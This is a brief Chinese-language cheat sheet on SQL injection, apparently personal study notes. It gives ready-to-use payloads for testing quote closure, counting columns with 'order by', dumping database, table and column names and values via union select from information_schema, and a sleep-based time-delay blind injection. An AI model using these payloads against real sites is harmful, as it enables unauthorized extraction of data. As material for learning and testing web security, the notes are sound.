# 分类

盲注和有回显的注入

# 有回显的注入

## 联合查询unionselect

先判断是字符型的闭合还是数字型，如果是字符型是单引号闭合还是双引号，有没有括号。

```
id=1
id=1'
id=1"
id=1')
```

然后order by看有几个字段

```
id=1' order by 4 -- a
```

然后爆库名表名列名，再爆列值

```
id=1' union select 1,2,database() -- a
id=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- a
id=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=#tablename -- a
id=1' union select 1,2,group_concat(#columnname) from #tablename -- a
```



# 无回显盲注（一般需要脚本配合）

## 时间延迟型盲注

利用sql中sleep和if函数，满足语句条件则休眠一段时间

if函数：if（条件，返回值1，返回值2）

用法：if((length(database())>3,sleep(5),1)  #意思是如果满足数据库长度大于3，睡眠5秒，否则返回值1